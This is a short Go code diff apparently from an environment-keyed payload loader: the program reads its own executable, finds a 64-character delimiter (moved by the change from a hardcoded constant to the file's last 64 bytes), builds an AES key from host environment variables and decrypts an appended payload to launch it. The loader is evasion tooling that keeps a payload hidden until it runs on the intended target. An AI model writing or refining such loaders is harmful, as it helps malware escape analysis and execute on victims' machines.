@@ -23,8 +23,6 @@ import (
 )
 
 func main() {
-	// string used to delimit code boundry
-	magic := "9BC5440033354F2EBEEED2E6083903390A39B15489892A199F86A17CFA0F55B8"
 
 	// read in args
 	passwordPtr := flag.String("password", "", "optional password")
@@ -41,6 +39,9 @@ func main() {
 		panic(err)
 	}
 
+	// find the magic string (last 64 charaters of file)
+	magic := string(selfBytes[len(selfBytes)-64:])
+
 	// search image on disk for magic string
 	re, err := regexp.Compile(magic)
 	if err != nil {
@@ -49,9 +50,9 @@ func main() {
 
 	// get indexes of env list and payload offset
 	indexes := re.FindAllIndex(selfBytes, -1)
-	envKeyStartIndex := indexes[len(indexes)-2][1]
-	envKeyStopIndex := indexes[len(indexes)-1][0]
-	payloadOffset := indexes[len(indexes)-1][1]
+	envKeyStartIndex := indexes[len(indexes)-3][1]
+	envKeyStopIndex := indexes[len(indexes)-2][0]
+	payloadOffset := indexes[len(indexes)-2][1]
 
 	// get list of env keys used to construct encryption key
 	envKeyStr := string(selfBytes[envKeyStartIndex:envKeyStopIndex])
@@ -64,7 +65,7 @@ func main() {
 	encKeySha256 := sha256.Sum256([]byte(encKey))
 
 	// create and launch payload
-	ciphertext := selfBytes[payloadOffset:]
+	ciphertext := selfBytes[payloadOffset:len(selfBytes)-64]
 
 	// Decrypt Payload
 	c, err := aes.NewCipher(encKeySha256[:])
